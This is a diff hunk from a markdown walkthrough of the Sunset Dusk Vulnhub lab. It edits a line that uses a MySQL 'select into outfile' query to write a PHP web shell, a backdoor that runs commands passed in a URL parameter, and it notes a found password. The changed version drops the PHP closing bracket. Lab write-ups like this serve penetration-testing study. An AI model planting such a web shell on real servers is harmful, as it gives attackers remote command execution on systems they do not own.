@@ -104,7 +104,7 @@ Found password **password**
 
 Injecting RCE payload 
 
-select "<?php echo system($_GET['cmd']); ?>" into outfile "/var/tmp/backdoor.php";
+select "<?php echo system($_GET['cmd']); ?" into outfile "/var/tmp/backdoor.php";
 
 ![Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%208.png](Sunset%20Dusk%20~Vulnhub%20Walkthrough%2073c8265aad554c15a57c73cfc5c941cd/Untitled%208.png)
 
